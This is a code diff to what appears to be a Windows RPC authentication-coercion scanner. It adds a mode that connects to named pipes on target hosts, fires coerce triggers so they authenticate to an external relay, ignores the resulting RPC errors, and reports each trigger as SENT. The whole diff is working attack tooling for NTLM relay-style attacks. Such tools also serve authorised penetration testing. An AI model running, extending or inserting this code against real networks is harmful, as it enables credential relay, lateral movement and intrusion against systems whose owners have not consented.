@@ -53,6 +53,7 @@ _STATUS_STYLE = {
     TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
     TriggerResult.TIMEOUT: ("magenta", "[T]"),
     TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
+    TriggerResult.SENT: ("cyan", "[>]"),
 }
 
 
@@ -278,7 +279,14 @@ class Scanner:
         binding: PipeBinding,
         transport: Transport,
     ) -> None:
-        """Single coerce trigger — no listener, fire and report."""
+        """Single coerce trigger — fire and report SENT, no classification.
+
+        Coerce mode just sends triggers to an external relay.  We don't
+        classify RPC results because the relay intercepts the auth and
+        the RPC call will typically timeout or error.  We only distinguish
+        between "we managed to send the trigger" (SENT) and "we couldn't
+        even connect to the pipe" (CONNECT_ERROR).
+        """
         pool = self._pool
         assert pool is not None
         async with self._semaphore:
@@ -296,7 +304,37 @@ class Scanner:
                 path_style="share_file",
             )
 
-            result = await trigger_method(pool, target, method, binding, path)
+            # Try to connect to the pipe
+            try:
+                dce = await pool.get_session(target, binding)
+            except Exception as e:
+                result = ScanResult(
+                    target=target,
+                    protocol=method.protocol_short,
+                    method=method.function_name,
+                    pipe=binding.pipe,
+                    uuid=binding.uuid,
+                    result=TriggerResult.CONNECT_ERROR,
+                    error=str(e),
+                )
+                self.stats.add(result)
+                self._emit(result)
+                return
+
+            # Fire the trigger — we don't care about the RPC response
+            try:
+                await asyncio.to_thread(method.trigger_fn, dce, path, target)
+            except Exception:
+                pass  # Expected: relay intercepts auth, RPC call fails
+
+            result = ScanResult(
+                target=target,
+                protocol=method.protocol_short,
+                method=method.function_name,
+                pipe=binding.pipe,
+                uuid=binding.uuid,
+                result=TriggerResult.SENT,
+            )
             self.stats.add(result)
             self._emit(result)
 
@@ -424,10 +462,12 @@ class Scanner:
 
     def _emit(self, result: ScanResult) -> None:
         """Print a result line (only for interesting results unless verbose)."""
-        if self.config.verbose or result.result in (
+        show = self.config.verbose or result.result in (
             TriggerResult.VULNERABLE,
             TriggerResult.ACCESSIBLE,
-        ):
+            TriggerResult.SENT,
+        )
+        if show:
             style, sym = _STATUS_STYLE.get(result.result, ("dim red", "[?]"))
             cb = " [bold green](callback!)[/]" if result.callback_received else ""
             self.console.print(
